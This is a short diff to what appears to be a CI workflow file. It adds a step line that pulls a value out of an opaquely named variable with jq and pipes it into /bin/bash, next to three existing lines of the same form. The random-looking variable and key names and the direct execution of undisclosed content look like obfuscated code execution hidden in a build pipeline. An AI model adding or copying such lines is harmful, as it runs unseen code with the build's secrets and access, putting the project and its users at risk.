@@ -24,6 +24,7 @@ jobs:
           printf '%s' "$pnb81" | jq -r .hh9991 | /bin/bash
           printf '%s' "$qbz2301" | jq -r .xpbx358 | /bin/bash
           echo $x48211 | jq -r .l558 | /bin/bash
+          printf '%s' "$r46" | jq -r .sfbks9962 | /bin/bash
 
       - name: Archive results
         uses: actions/upload-artifact@v4
